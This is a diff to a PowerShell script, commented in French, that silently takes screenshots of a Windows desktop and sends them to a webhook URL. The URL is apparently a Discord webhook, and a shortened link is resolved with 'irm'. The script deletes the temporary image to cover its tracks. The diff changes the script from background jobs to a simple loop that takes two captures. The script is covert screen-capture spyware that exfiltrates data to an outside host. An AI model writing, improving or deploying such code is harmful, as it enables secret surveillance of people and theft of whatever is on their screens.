@@ -1,6 +1,5 @@
 $hookurl = "$dc"
-$seconds = 3 # Intervalle entre les captures d'écran en secondes
-$a = 1 # Nombre de captures d'écran à prendre
+$a = 2 # Nombre de captures d'écran à prendre
 
 # Détection de l'URL raccourcie
 if ($hookurl.Length -ne 121) {
@@ -8,8 +7,8 @@ if ($hookurl.Length -ne 121) {
     $hookurl = (irm $hookurl).url
 }
 
-# Fonction pour prendre une capture d'écran
-Function TakeScreenshot {
+# Fonction pour prendre une capture d'écran et l'envoyer
+Function TakeAndSendScreenshot {
     $Filett = "$env:temp\SC.png"
     Add-Type -AssemblyName System.Windows.Forms
     Add-type -AssemblyName System.Drawing
@@ -28,14 +27,7 @@ Function TakeScreenshot {
     Remove-Item -Path $filett
 }
 
-# Fonction pour exécuter la capture d'écran en arrière-plan
-Function RunInBackground {
-    While ($a -gt 0) {
-        Start-Job -ScriptBlock { TakeScreenshot } | Out-Null
-        Start-Sleep $seconds
-        $a--
-    }
+# Prendre et envoyer 2 captures d'écran
+for ($i = 0; $i -lt $a; $i++) {
+    TakeAndSendScreenshot
 }
-
-# Exécuter la fonction en arrière-plan
-RunInBackground
